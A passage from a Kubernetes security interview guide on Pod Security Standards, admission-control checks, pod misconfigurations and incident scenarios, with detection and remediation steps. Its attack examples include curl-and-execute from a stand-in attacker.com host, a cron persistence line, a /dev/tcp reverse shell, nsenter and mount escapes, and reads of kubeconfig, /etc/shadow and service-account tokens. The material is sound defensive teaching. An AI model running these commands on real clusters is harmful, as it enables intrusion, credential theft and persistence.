│  └─────────────────┘    └─────────────────┘    └──────────────────────┘        │
│                                                                                 │
│       LEAST SECURE ◄──────────────────────────────► MOST SECURE                │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Pod Security Admission (PSA) — How It's Enforced

```yaml
# Apply PSS via namespace labels:
apiVersion: v1
kind: Namespace
metadata:
  name: payments
  labels:
    # MODE can be: enforce, audit, or warn
    pod-security.kubernetes.io/enforce: restricted      # BLOCK non-compliant pods
    pod-security.kubernetes.io/audit: restricted         # LOG violations in audit log
    pod-security.kubernetes.io/warn: restricted          # WARN on kubectl apply
    pod-security.kubernetes.io/enforce-version: latest   # Pin to K8s version
```

| PSA Mode | What Happens | When to Use |
|----------|-------------|-------------|
| **enforce** | Pod is **REJECTED** if it violates the profile | Production namespaces (after testing) |
| **audit** | Pod is **ALLOWED** but violation is logged in K8s audit log | Pre-production dry run |
| **warn** | Pod is **ALLOWED** but user sees a warning on `kubectl apply` | Developer awareness |

### Complete PSS Controls List — What Each Profile Blocks

#### 🟡 BASELINE Profile Controls (blocks these 11 settings)

| # | Control | What It Blocks | Why It's Dangerous |
|---|---------|---------------|-------------------|
| 1 | **HostProcess** | `hostProcess: true` (Windows containers) | Gives full host access |
| 2 | **Host Namespaces** | `hostNetwork: true`, `hostPID: true`, `hostIPC: true` | Shares host's network/process/IPC space — attacker sees all host processes |
| 3 | **Privileged Containers** | `privileged: true` | Gives ALL Linux capabilities + unrestricted device access → container escape |
| 4 | **Capabilities** | Adding caps beyond the allowed list: `AUDIT_WRITE, CHOWN, DAC_OVERRIDE, FOWNER, FSETID, KILL, MKNOD, NET_BIND_SERVICE, SETFCAP, SETGID, SETPCAP, SETUID, SYS_CHROOT` | Dangerous caps like `SYS_ADMIN`, `NET_RAW`, `SYS_PTRACE` enable kernel exploits |
| 5 | **HostPath Volumes** | `hostPath` volume mounts | Mounts node's filesystem into pod → read/write host files directly |
| 6 | **Host Ports** | `hostPort` (except 0) | Binds container directly to host port → bypasses NetworkPolicies |
| 7 | **AppArmor** | Overriding AppArmor to `unconfined` | Disables mandatory access control |
| 8 | **SELinux** | Custom SELinux options (type must be from allowed list or unset) | Prevents escaping SELinux confinement |
| 9 | **`/proc` Mount Type** | `procMount: Unmasked` | Default masks sensitive `/proc` paths; unmasking exposes host kernel info |
| 10 | **Seccomp** | `seccomp: Unconfined` | Disables system call filtering entirely — opens kernel attack surface |
| 11 | **Sysctls** | Any unsafe sysctl (only safe: `kernel.shm*`, `net.ipv4.ip_local_port_range`, `net.ipv4.tcp_syncookies`, `net.ipv4.ping_group_range`, `net.ipv4.ip_unprivileged_port_start`) | Unsafe sysctls can modify kernel behavior from inside a pod |

#### 🔴 RESTRICTED Profile Controls (everything in Baseline PLUS these 6)

| # | Control | What It Adds | Why |
|---|---------|-------------|-----|
| 12 | **Volume Types** | Only allows: `configMap, csi, downwardAPI, emptyDir, ephemeral, persistentVolumeClaim, projected, secret` — **blocks hostPath, nfs, iscsi, etc.** | Prevents all host/external filesystem access |
| 13 | **Privilege Escalation** | `allowPrivilegeEscalation` must be `false` | Prevents SUID binaries or setuid from elevating privileges |
| 14 | **Running as Non-Root** | `runAsNonRoot` must be `true` | Root inside container ≈ root on host in many escape scenarios |
| 15 | **Running as Non-Root User** | `runAsUser` cannot be `0` | Enforces non-root at the UID level (belt + suspenders with #14) |
| 16 | **Seccomp Profile Required** | Must be `RuntimeDefault` or `Localhost` — NOT `Unconfined` | Forces system call filtering to prevent kernel exploits |
| 17 | **Capabilities** | Must `drop: ["ALL"]`. Only `NET_BIND_SERVICE` may be added back | True least privilege — removes every Linux capability by default |

> **Interview Quick Answer:** "Baseline blocks **11** dangerous settings like privileged mode, hostNamespaces, and hostPath. Restricted adds **6 more** including drop-ALL capabilities, runAsNonRoot, and mandatory seccomp. Together they define 17 controls covering the full pod attack surface."

**Rollout Strategy:**
```
Week 1-2: audit + warn on all namespaces → collect violations
Week 3:   Review violations → work with teams to fix configs
Week 4:   enforce on staging → verify no legitimate breakage
Week 5+:  enforce on production → exception process for system pods
```

### PSS ↔ CNAPP/KAC Mapping

| PSS Control | KAC Equivalent | Falcon IOM Check |
|------------|---------------|-----------------|
| No privileged containers | KAC blocks `privileged: true` | `PrivilegedContainerDetected` |
| No host namespaces | KAC blocks hostPID/hostNetwork/hostIPC | `HostNamespaceSharingDetected` |
| No hostPath volumes | KAC blocks HostPath volume type | `HostPathVolumeMounted` |
| Must run as non-root | KAC enforces `runAsNonRoot: true` | `ContainerRunningAsRoot` |
| Drop ALL capabilities | KAC checks capability list | `ExcessiveCapabilitiesGranted` |
| No privilege escalation | KAC checks `allowPrivilegeEscalation` | `PrivilegeEscalationAllowed` |
| Seccomp required | KAC checks for seccomp profile | `NoSeccompProfileApplied` |
| Restrict volume types | KAC blocks HostPath, NFS unsafe mounts | `UnsafeVolumeTypeMounted` |

---

### 10 PSS MISCONFIGURATIONS — Real Scenarios, Detection, and Response

---

#### Misconfig 1: `privileged: true` — Full Host Access

**The Bad Config:**
```yaml
securityContext:
  privileged: true    # ← This gives the container FULL host kernel access
```

**Why It's Dangerous:** A privileged container can access ALL host devices, load kernel modules, modify iptables, mount the host filesystem via `/dev/sda1`, and escape the container entirely. It's equivalent to running as root on the host.

**Real Attack Scenario:**
An attacker exploits an RCE in a web app running in a privileged container. They run:
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash  # Full host access
cat /var/lib/kubelet/kubeconfig                              # Cluster admin creds
```
Now they own the entire node and can pivot to the control plane.

**Console Detection:**
- **CSPM → Posture → Kubernetes misconfigurations**: `PrivilegedContainerDetected` (CRITICAL)
- **KAC Policy**: Blocks deployment if set to PREVENT
- **CWPP Detection**: `ContainerEscape.Nsenter` fires if exploitation occurs

**Remediation:**
1. Remove `privileged: true` from all pod specs
2. Identify which specific capabilities the app actually needs
3. Grant ONLY those capabilities: `capabilities: { add: ["NET_ADMIN"] }`
4. Set KAC to PREVENT for privileged containers across all production namespaces
5. Exception: Only system DaemonSets (CNI, CSI, Falcon sensor) may be privileged — documented and scoped to `kube-system` / `falcon-system`

**Interview Answer:**
> "No production application should ever run as privileged. When I find this, I investigate what specific Linux capabilities the app actually needs — usually it's one or two like `NET_ADMIN` or `SYS_PTRACE`. I replace `privileged: true` with those specific capabilities. KAC blocks privileged pods in PREVENT mode. The only exception is system infrastructure in `kube-system` — and even those are documented and reviewed quarterly."

---

#### Misconfig 2: Container Running as Root (`runAsUser: 0`)

**The Bad Config:**
```yaml
securityContext:
  runAsUser: 0          # ← Running as UID 0 (root)
  # OR: no runAsNonRoot: true specified (defaults to root in most images)
```

**Why It's Dangerous:** Root inside the container = root on the host if any escape vector exists. Even without escaping, root can modify the container filesystem, install tools, read sensitive mounted files, and exploit SUID binaries.

**Real Attack Scenario:**
Attacker exploits a Java deserialization vuln. Because the container runs as root, they:
```bash
apt-get install -y nmap netcat    # Install offensive tools (writable filesystem)
cat /var/run/secrets/kubernetes.io/serviceaccount/token  # Read SA token
curl -k https://kubernetes.default/api/v1/namespaces    # Query K8s API
```
If the container ran as non-root (UID 1000), `apt-get install` would fail, and tools couldn't be installed.

**Console Detection:**
- **CSPM → IOM**: `ContainerRunningAsRoot` (HIGH)
- **KAC**: Blocks if `runAsNonRoot: true` is required by policy
- **PSA**: `restricted` profile rejects pods without `runAsNonRoot: true`

**Remediation:**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000        # Non-root UID
  runAsGroup: 1000
```
Update the Dockerfile: `USER 1000:1000` (ensure app can run as non-root).

**Interview Answer:**
> "Running as root is the most common K8s security misconfiguration. I enforce `runAsNonRoot: true` at the namespace level via PSA restricted profile and via KAC. The key is working with developers — many apps assume root. I help teams update their Dockerfiles to use a non-root user and verify the app works correctly before enforcing."

---

#### Misconfig 3: Writable Root Filesystem

**The Bad Config:**
```yaml
securityContext:
  readOnlyRootFilesystem: false   # ← OR: field not specified (default = writable)
```

**Why It's Dangerous:** Attackers can write malware, scripts, and offensive tools directly to the container filesystem. This is how container drift works — new binaries appear post-start.

**Real Attack Scenario:**
Attacker exploits RCE, downloads a reverse shell:
```bash
curl -o /tmp/rev.sh http://attacker.com/shell.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh
```
With `readOnlyRootFilesystem: true`, this `curl -o` write operation FAILS entirely.

**Console Detection:**
- **CSPM → IOM**: `WritableRootFilesystem` (MEDIUM)
- **CWPP**: `ContainerDrift.NewExecutable` — detects file written post-start
- **KAC**: Can enforce `readOnlyRootFilesystem: true`

**Remediation:**
```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
  - name: tmp
    mountPath: /tmp         # mount tmpfs for legitimate temp file needs
volumes:
  - name: tmp
    emptyDir: {}            # tmpfs — ephemeral, not persisted
```

**Interview Answer:**
> "Read-only root filesystem is one of the most effective security controls against container drift. It prevents attackers from writing malware or tools to the container. Apps that need write access for logs or temp files get mounted emptyDir volumes at specific paths. Combined with drift detection in PREVENT mode, this blocks almost all post-exploitation tooling."

---

#### Misconfig 4: `allowPrivilegeEscalation: true`

**The Bad Config:**
```yaml
securityContext:
  allowPrivilegeEscalation: true   # ← Allows gaining more privileges than parent
  # OR: not specified (defaults to TRUE if not explicitly set to false)
```

**Why It's Dangerous:** Enables `setuid`/`setgid` binaries to escalate privileges. Even a non-root container can become root via a SUID binary like `su`, `sudo`, or a vulnerable application.

**Real Attack Scenario:**
Container runs as UID 1000, but `allowPrivilegeEscalation` is not set to false. Attacker finds a SUID binary:
```bash
find / -perm -4000 2>/dev/null    # Find SUID binaries
# /usr/bin/newgrp is SUID root
newgrp root                        # Escalate to root
```

**Console Detection:**
- **CSPM → IOM**: `PrivilegeEscalationAllowed` (HIGH)
- **KAC**: Blocks if policy requires `allowPrivilegeEscalation: false`
- **PSA**: `restricted` profile requires `allowPrivilegeEscalation: false`

**Remediation:**
```yaml
securityContext:
  allowPrivilegeEscalation: false    # Explicitly set to false
```

**Interview Answer:**
> "This is a sneaky default — Kubernetes defaults `allowPrivilegeEscalation` to true if not specified. I enforce `false` across all workloads via KAC. The PSA restricted profile also catches this. It's critical because even a properly non-root container can escalate to root via SUID binaries if this isn't set."

---

#### Misconfig 5: Excessive Linux Capabilities (`CAP_SYS_ADMIN`)

**The Bad Config:**
```yaml
securityContext:
  capabilities:
    add:
      - SYS_ADMIN       # ← Equivalent to giving root-like powers
      - NET_RAW          # ← Can craft raw packets, ARP spoofing
      - SYS_PTRACE       # ← Can attach to other processes, read memory
```

**Why It's Dangerous:** `CAP_SYS_ADMIN` is the "god capability" — it allows mounting filesystems, loading eBPF programs, managing namespaces, and many operations that enable container escape. `NET_RAW` enables network sniffing and spoofing attacks.

**Real Attack Scenario:**
Container with `CAP_SYS_ADMIN` — attacker mounts the host filesystem:
```bash
mkdir /host && mount /dev/sda1 /host    # Mount host root filesystem
chroot /host                             # Escape to host
```

**Console Detection:**
- **CSPM → IOM**: `ExcessiveCapabilitiesGranted` (CRITICAL for SYS_ADMIN)
- **KAC**: Can block specific capabilities
- **PSA**: `restricted` requires `drop: ["ALL"]` and only allows a short allowlist

**Remediation:**
```yaml
securityContext:
  capabilities:
    drop:
      - ALL              # Drop everything first
    add:
      - NET_BIND_SERVICE # Add back ONLY what's needed (e.g., bind port <1024)
```

**PSS Restricted Profile allows ONLY:** `NET_BIND_SERVICE` (all others must be dropped).

**Interview Answer:**
> "The principle is: drop ALL capabilities, then add back only what the application specifically requires. In practice, most apps need zero additional capabilities. Web servers binding to port 80 might need `NET_BIND_SERVICE`. If a team requests `SYS_ADMIN`, that's a red flag — I investigate the actual requirement because there's almost always a more specific capability or an alternative approach."

---

#### Misconfig 6: Host Namespace Sharing (`hostPID`, `hostNetwork`, `hostIPC`)

**The Bad Config:**
```yaml
spec:
  hostPID: true        # ← Container sees all host processes
  hostNetwork: true    # ← Container uses host's network stack directly
  hostIPC: true        # ← Container shares host IPC (shared memory)
```

**Why It's Dangerous:**
- `hostPID`: Container can see and signal ALL host processes, including other containers. Enables process injection.
- `hostNetwork`: Container bypasses K8s network isolation (NetworkPolicies don't apply). Can sniff traffic on the host network.
- `hostIPC`: Can read shared memory from other processes on the host.

**Real Attack Scenario (hostPID):**
```bash
# From inside the container with hostPID
ps aux                                 # See ALL host processes
nsenter --target <PID> --mount -- bash # Enter another container's namespace
cat /proc/<PID>/environ                # Read environment vars (secrets!)
```

**Console Detection:**
- **CSPM → IOM**: `HostPIDSharingEnabled` / `HostNetworkEnabled` / `HostIPCEnabled` (HIGH each)
- **KAC**: Can block all three individually
- **PSA**: `baseline` profile already blocks all three

**Remediation:** Remove all `host*: true` settings. If networking requires host-level access, use a `hostPort` mapping instead of `hostNetwork` where possible.

**Interview Answer:**
> "Host namespace sharing breaks container isolation entirely. `hostPID` gives the container visibility into every process on the node — including other containers' secrets in environment variables. `hostNetwork` bypasses NetworkPolicies. These should be blocked by KAC's baseline policies. The only exception is system infrastructure like CNI plugins, and those are restricted to `kube-system`."

---

#### Misconfig 7: HostPath Volume Mount

**The Bad Config:**
```yaml
volumes:
  - name: host-root
    hostPath:
      path: /               # ← Mounts the ENTIRE host filesystem
      type: Directory
# Or commonly:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock   # ← Docker socket = container escape
```

**Why It's Dangerous:** HostPath mounts give the container read/write access to the host filesystem. Mounting `/` = full host access. Mounting `/var/run/docker.sock` = ability to create containers outside Kubernetes.

**Real Attack Scenario:**
```bash
# Container with hostPath: /
cat /host/etc/shadow                    # Read host password hashes
cat /host/var/lib/kubelet/kubeconfig    # Get cluster admin credentials
echo "*/1 * * * * root curl http://attacker.com/shell.sh | bash" >> /host/etc/crontab
# ↑ Persistence via host cron
```

**Console Detection:**
- **CSPM → IOM**: `HostPathVolumeMounted` (CRITICAL for `/`, HIGH for docker.sock)
- **KAC**: Can block HostPath volume types entirely
- **PSA**: `restricted` profile blocks HostPath volumes

**Remediation:** Replace `hostPath` with:
- `emptyDir` for temporary storage
- `PersistentVolumeClaim` for persistent storage
- `configMap` / `secret` for configuration
- For logging: use a sidecar or DaemonSet log collector instead of writing to host path

**Interview Answer:**
> "HostPath volumes are the easiest path to container escape. I enforce a KAC rule that blocks HostPath in all namespaces except `kube-system`. Docker socket mounts are an absolute blocker — they allow creating containers directly on the Docker daemon, bypassing all Kubernetes security controls. For CI/CD builds that need Docker, I recommend Kaniko (daemonless image builder)."

---

#### Misconfig 8: No Seccomp Profile Applied

**The Bad Config:**
```yaml
securityContext:
  # No seccompProfile specified — uses Unconfined (no syscall filtering)
```

**Why It's Dangerous:** Without seccomp, the container has access to ALL ~300+ Linux syscalls. Attackers can use dangerous syscalls like `ptrace` (attach to processes), `mount` (mount filesystems), `unshare` (create new namespaces), and `reboot` (crash the node).

**Real Attack Scenario:**
Without seccomp, attacker uses `unshare` to create a new namespace and escape:
```bash
unshare -Urpf --mount-proc bash    # New user namespace with root
# Now has root in new namespace — can attempt further escape
```
With `RuntimeDefault` seccomp, `unshare` is blocked.

**Console Detection:**
- **CSPM → IOM**: `NoSeccompProfileApplied` (MEDIUM)
- **KAC**: Can require seccomp profile
- **PSA**: `restricted` profile requires `RuntimeDefault` or `Localhost` seccomp

**Remediation:**
```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault    # Docker/containerd default — blocks ~44 dangerous syscalls
    # OR for stricter:
    # type: Localhost
    # localhostProfile: profiles/custom.json
```

**Syscalls blocked by RuntimeDefault include:** `ptrace`, `mount`, `umount`, `reboot`, `settimeofday`, `swapon`, `swapoff`, `init_module`, `delete_module`

**Interview Answer:**
> "Seccomp is the last line of defense at the kernel level. `RuntimeDefault` blocks ~44 dangerous syscalls with zero impact on most applications. I enforce it via the PSA restricted profile and KAC. For high-security workloads, I create custom seccomp profiles that only allow the exact syscalls the application uses — tools like `strace` and `seccomp-audit` help identify the minimum required set."

---

#### Misconfig 9: Missing Resource Limits (CPU/Memory)

**The Bad Config:**
```yaml
containers:
  - name: app
    image: myapp:latest
    # ← No resources.requests or resources.limits specified
```

**Why It's Dangerous:** Without resource limits, a single compromised container can consume ALL node resources. A cryptominer or fork bomb can starve other pods, including the Falcon sensor DaemonSet, causing monitoring blind spots.

**Real Attack Scenario:**
Attacker deploys XMRig cryptominer. Without CPU limits, it consumes 100% of the node's CPU:
- Other pods on the node get OOM killed or CPU-starved
- Falcon sensor DaemonSet can't process telemetry → detection delay/failure
- Node becomes unresponsive → cascading failures

**Console Detection:**
- **CSPM → IOM**: `NoResourceLimitsSet` (MEDIUM)
- **KAC**: Can enforce resource limits as mandatory
- **CWPP**: `CryptominingActivity` will still fire but with delay if sensor is resource-starved

**Remediation:**
```yaml
resources:
  requests:
    cpu: "100m"
    memory: "128Mi"
  limits:
    cpu: "500m"
    memory: "512Mi"
```
Also set `LimitRange` objects per namespace to enforce defaults:
```yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: default-limits
  namespace: production
spec:
  limits:
    - default:
        cpu: "500m"
        memory: "512Mi"
      defaultRequest:
        cpu: "100m"
        memory: "128Mi"
      type: Container
```

**Interview Answer:**
> "Resource limits aren't just about cost optimization — they're a security control. Without limits, a cryptominer or fork bomb can DoS the entire node, including the security sensor. I enforce resource limits via LimitRange per namespace and KAC policies. This also prevents noisy-neighbor attacks where one compromised pod starves the node."

---

#### Misconfig 10: Service Account Token Auto-Mount

**The Bad Config:**
```yaml
spec:
  # automountServiceAccountToken not specified → defaults to TRUE
  # Every pod gets a K8s API token mounted at:
  # /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Why It's Dangerous:** Most application pods NEVER need to talk to the K8s API. But by default, every pod gets an API token mounted. If the container is compromised, the attacker reads the token and uses it to query the K8s API — list secrets, create pods, escalate privileges.

**Real Attack Scenario:**
Attacker compromises a web app → reads the service account token:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/api/v1/namespaces/default/secrets
# Lists ALL secrets in the namespace if RBAC allows
```

**Console Detection:**
- **CSPM → IOM**: `ServiceAccountTokenAutoMounted` (MEDIUM)
- **CWPP**: `SuspiciousKubernetesAPIAccess` — detects unusual API queries from pods
- **KAC**: Can enforce `automountServiceAccountToken: false`

**Remediation:**
```yaml
# On the ServiceAccount:
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-app-sa
automountServiceAccountToken: false    # Disable auto-mount

# OR on the Pod spec (overrides SA setting):
spec:
  automountServiceAccountToken: false
```
For pods that DO need API access: use a dedicated ServiceAccount with minimal RBAC + short-lived token (TokenRequest API).

**Interview Answer:**
> "Service account token auto-mounting is a silent attack surface. 90% of pods never need to talk to the K8s API, but every pod gets a token by default. I disable auto-mounting globally via KAC policy, then create dedicated ServiceAccounts with minimal RBAC only for pods that actually need API access. This single change eliminates the most common post-exploitation pivot vector in Kubernetes."

---

### PSS Enforcement Interview Summary

> **The Key Message:** "Pod Security Standards give you three predefined security profiles — Privileged, Baseline, and Restricted. I enforce at least the Baseline profile on all namespaces and Restricted on security-critical namespaces like payments and PII. KAC supplements PSA by adding image scanning gates and custom organization policies that PSA can't cover. Together, PSA + KAC form a double admission gate: PSA enforces security context standards, KAC adds runtime image trust and CrowdStrike-specific policies."

---

# SECTION 4: INCIDENT SCENARIOS — 20 REAL-WORLD SITUATIONS

> Each scenario: What Happened → How to Detect in the Console → Investigation Steps → Containment → Prevention → Interview Answer

---

## Scenario 1: Reverse Shell from a Container

**Situation:** Web application pod compromised via RCE. Attacker spawns reverse shell.

**Console Navigation:**
1. **Detections → IOA → `ReverseShellDetected`**
2. Click detection → Process Tree: `node → sh → bash -i >& /dev/tcp/attacker-ip/4444`
3. Drift indicator: `bash` not in original image
4. Network tab: outbound TCP to non-standard port

**Actions:** Kill pod → deny-all NetworkPolicy → patch app → enforce `readOnlyRootFilesystem` → default-deny egress

**Interview Answer:**
> "Web servers should never spawn bash. The process tree is the primary signal. Drift confirms the shell wasn't in the image. Immediate: kill the pod, isolate the namespace. Long-term: readOnlyRootFilesystem, default-deny egress, and drift prevention in PREVENT mode."

---

## Scenario 2: Privileged Container Breakout

**Situation:** Pod with `privileged: true` compromised. Attacker mounts host filesystem via nsenter.

**Console Navigation:**
1. **Detections → IOA → `PotentialKernelTampering` / `ContainerEscape.Nsenter`**
2. Process tree: `app → nsenter --target 1 --mount --pid --net -- bash`
3. File access: `/var/lib/kubelet/kubeconfig` read

**Actions:** Kill pod → cordon node → rotate ALL cluster secrets → replace node → set KAC to PREVENT for privileged containers

**Interview Answer:**
> "Privileged container + nsenter = assume full node compromise. I kill the pod, cordon the node, and rotate all cluster secrets because kubelet credentials were potentially accessed. KAC should never allow `privileged: true` in production."

---

## Scenario 3: Cryptominer via Supply Chain (Poisoned Image)

**Situation:** Upstream Docker Hub image compromised. XMRig miner runs as thread inside Python process at 40% CPU.

**Console Navigation:**
1. **Detections → IOA → `CryptominingActivity.UnusualCPUPattern`**
2. Network: persistent connections to mining pool IPs (Falcon Intel flagged)
3. `SuspiciousLibraryLoad`: libssl.so SHA256 mismatch vs official image
4. **Posture → IOM**: image using floating tag, no digest pin

**Actions:** Quarantine pod → extract malicious library (RTR) → switch to digest-pinned images from private ECR → KAC blocks unassessed images

**Interview Answer:**
> "Supply chain attacks are the hardest to detect because the malware ships inside the trusted image. The signals were: CPU anomaly at 40%, connections to mining pool IPs flagged by Falcon threat intel, and a library SHA256 mismatch. My prevention approach: never use floating tags from Docker Hub — pin to digest, mirror to private ECR, enforce KAC image assessment, and monitor for unusual CPU/network patterns as a backstop."

---

## Scenario 4: Sleeping IAM Key Reactivated

**Situation:** Terminated employee's IAM key reactivated by intern's script error. Credential appears on dark web within 3 hours.

**Console Navigation:**
1. **Posture → IOM → `IAMAccessKeyInactive90DaysNotDeleted`** (47 days old)
2. **Posture → IOM → `IAMAccessKeyStatusChange`** (new — key reactivated)
3. **CIEM → Identity graph**: user marked TERMINATED in HR integration

**Actions:** Invalidate the key → apply inline deny → reconcile all keys against HR system weekly → automate JML (Joiner-Mover-Leaver) process

**Interview Answer:**
> "This is a process failure, not a tool failure. The CSPM flagged inactive keys for 47 days — nobody acted. My fix: automate JML with Lambda that deactivates keys when employees leave, enforce 90-day key rotation via SCP, and create an SLA that forces IAM key IOMs to be resolved within 48 hours. No dormant key should exist past 90 days."

---

## Scenario 5: ArgoCD Takeover via Default Password

**Situation:** ArgoCD with default admin password on public LoadBalancer. Attacker deploys DaemonSet via GitOps.

**Console Navigation:**
1. **Posture → IOM**: "ArgoCD exposed via public LoadBalancer" (11 days old, CRITICAL)
2. **Posture → IOM**: "ArgoCD default admin password unchanged" (CRITICAL)
3. **Detections → IOA**: `SuspiciousKubernetesDaemonSet` — unapproved registry, privileged
4. **KAC**: BLOCKED deployment (image from external registry)

**Key Lesson:** CSPM findings existed 11 days before attack. Nobody acted. CSPM SLA enforcement is critical.

**Interview Answer:**
> "ArgoCD with default credentials on a public LB is a gift to attackers. Two CRITICAL IOMs sat unfixed for 11 days — that's a process failure. KAC saved us by blocking the malicious DaemonSet from an unapproved registry. My takeaway: enforce SLAs on CRITICAL CSPM findings (24 hours max), and always restrict admin consoles behind VPN or internal network. This scenario is why I track MTTR on CSPM findings."

---

## Scenario 6: Lambda Persistence Backdoor via AWS Config

**Situation:** Contractor creates AWS Config rule that re-creates a backdoor IAM role every 24 hours.

**Console Navigation:**
1. **Posture → IOM**: "IAM role created outside IaC pipeline" (Day 6)
2. **Posture → IOM**: "Config remediation points to unknown Lambda" (Day 8)
3. **Detections → IOA**: "Lambda performing IAM operations" (Day 10)
4. **CIEM**: `AnomalousRoleAssumption` — role assumed from external IP (Day 14)

**19-day timeline due to process failure. Three HIGH findings not correlated until Day 17.**

**Interview Answer:**
> "This is a sophisticated persistence technique — using AWS Config remediation rules as a trojan horse. Three individual HIGH findings weren't correlated for 17 days. My lesson: use Wiz Attack Paths or Falcon's Exposure Management to correlate IOMs that share the same identity or resource chain. A Lambda performing IAM operations combined with an out-of-band IAM role is a pattern I now watch for specifically."

---

## Scenario 7: IRSA JWT Stolen and Used Externally

**Situation:** Container escape → service account JWT stolen → used from external IP to assume IAM role.

**Console Navigation:**
1. **CloudTrail**: `AssumeRoleWithWebIdentity` from external IP
2. **CIEM**: `ExternalIRSAAbuse` alert

**Prevention:** All IRSA roles MUST have `aws:SourceVpc` condition. Enforce via SCP. This alert is virtually always a true positive.

**Interview Answer:**
> "IRSA JWT tokens are scoped to a cluster, but if the trust policy doesn't enforce `aws:SourceVpc`, stolen tokens work from anywhere. When I see `AssumeRoleWithWebIdentity` from an external IP, it's almost always a real compromise — there's no legitimate reason for IRSA to be used outside the VPC. I enforce `aws:SourceVpc` condition on every IRSA trust policy via SCP and monitor for this pattern in CloudTrail."

---

## Scenario 8: kubectl exec Abuse — Data Theft

**Situation:** Attacker gets leaked kubeconfig, execs into payments pod, reads env vars with DB credentials.

**Console Navigation:**
1. **K8s Audit Logs**: `pods/exec` from unknown IP
2. **Detections → IOA**: `InteractiveContainerSession`
3. Process tree: `sh → printenv | grep password → mysql -u admin`

**Prevention:** Restrict pods/exec to break-glass RBAC role. Secrets in Secrets Manager, not env vars.

**Interview Answer:**
> "kubectl exec is the K8s equivalent of SSH — it should be heavily restricted. I limit `pods/exec` to a break-glass ClusterRole that requires approval. The deeper issue here is secrets in environment variables — `printenv` gives everything. I move secrets to AWS Secrets Manager with External Secrets Operator, so even if someone execs in, there's nothing to read in env vars."

---

## Scenario 9: S3 Exfiltration via Pre-signed URLs

**Situation:** Compromised Lambda generates pre-signed URLs for PII bucket. Downloads appear as anonymous GET requests.

**Console Navigation:**
1. **CloudTrail**: `GeneratePresignedUrl` at high volume
2. **S3 Server Access Logs**: massive GetObject from external IPs
3. **Macie**: sensitive data access pattern anomaly

**Prevention:** Pre-signed URL max expiry 1 hour. VPC endpoint restriction. Macie monitoring on all PII buckets.

**Interview Answer:**
> "Pre-signed URLs are a blind spot because CloudTrail logs the generation, not the download. The downloads appear as anonymous GETs in S3 server access logs. For PII buckets, I enforce VPC endpoint policies so pre-signed URLs only work from within our VPC, cap expiry at 1 hour, and use Macie to detect abnormal data access patterns. This attack bypasses IAM because the URL is bearer-token-like."

---

## Scenario 10: Exposed Kubelet Port (10250)

**Situation:** Security group allows 10250 from 0.0.0.0/0 for 34 days. Attacker executes commands in pods via kubelet API.

**Console Navigation:**
1. **Posture → IOM**: "Security group allows 10250 from 0.0.0.0/0" (34 days old)
2. **GuardDuty**: `Recon:EC2/PortProbeUnprotectedPort`

**Prevention:** CIS EKS 3.2.1 — disable kubelet anonymous auth, restrict SG.

**Interview Answer:**
> "Port 10250 is the kubelet API — it allows executing commands in any pod on that node. It sat open for 34 days — a classic SLA failure. My remediation: lock SG to allow 10250 only from the control plane CIDR, disable kubelet anonymous auth, and add this specific check as a CRITICAL IOM with an automated SLA alert. GuardDuty's port probe finding should have triggered investigation immediately."

---

## Scenario 11: Container Drift — Offensive Tool Kit

**Situation:** RCE exploited in Node.js app. Attacker drops pspy, chisel, linpeas via curl.

**Console Navigation:**
1. **Detections → IOA**: `ContainerDrift.OffensiveToolDrop`
2. SHA256 hashes match known offensive tools in Falcon threat intel
3. Network: chisel tunnel keepalive (beacon pattern)

**Prevention:** Drift prevention in PREVENT mode. readOnlyRootFilesystem. Default-deny egress.

**Interview Answer:**
> "What made this interesting is the attacker dropped a complete toolkit — pspy for process snooping, chisel for tunneling, and linpeas for privilege escalation. Falcon matched the SHA256 hashes against its threat intel database. My layered defense: readOnlyRootFilesystem blocks the initial file write, drift prevention in PREVENT mode catches anything written to emptyDir volumes, and default-deny egress prevents downloading tools in the first place. All three layers matter."

---

## Scenario 12: Helm Chart Supply Chain Attack

**Situation:** Compromised Helm chart maintainer injects malicious InitContainer that exfiltrates SA tokens.

**Console Navigation:**
1. **Image Assessment**: InitContainer image fails trust verification
2. **Detections → IOA**: First-seen outbound connection from InitContainer
3. **KAC**: Blocks deployment (unapproved registry)

**Prevention:** All Helm charts pulled to private registry, scanned and signed before use.

**Interview Answer:**
> "Helm chart supply chain attacks are growing because teams blindly `helm install` from public repos. The malicious InitContainer ran before the main app, exfiltrated the ServiceAccount token, and terminated cleanly — leaving no trace in the running pod. KAC blocked deployment because the InitContainer image was from an unapproved registry. My rule: all Helm charts are vendored into our private registry, charts are reviewed in PR, and image references are pinned to digest."

---

## Scenario 13: Docker Socket Mount Exploitation

**Situation:** Container with `/var/run/docker.sock` mounted. Attacker creates privileged container outside K8s.

**Console Navigation:**
1. **Detections → IOA**: `SuspiciousDockerSocketAccess`
2. **Assets → Containers**: "Unidentified Container — Visible to K8s: No"
3. **Posture → IOM**: "docker.sock mounted as HostPath Volume"

**Prevention:** KAC blocks HostPath volume mounts for docker.sock. Use Kaniko for CI/CD builds.

**Interview Answer:**
> "Docker socket mount is one of the most dangerous K8s misconfigurations. With the socket, an attacker can `docker run --privileged` a new container completely outside Kubernetes — invisible to K8s RBAC, NetworkPolicies, and admission control. Falcon catches it because the sensor runs at the node level and sees all containers, even non-K8s ones. I block docker.sock mounts via KAC and migrate CI/CD to Kaniko for daemonless image builds."

---

## Scenario 14: DNS Tunneling for Data Exfiltration

**Situation:** Compromised container uses DNS queries with encoded data in subdomain labels to exfiltrate data.

**Console Navigation:**
1. **Detections → IOA**: `SuspiciousDNSRequest`
2. Network: hundreds of DNS queries/minute to single unusual domain
3. DNS query inspection: abnormally long subdomain labels (encoded data)

**Prevention:** Restrict pods to cluster DNS only. NetworkPolicies blocking UDP/53 to external IPs.

**Interview Answer:**
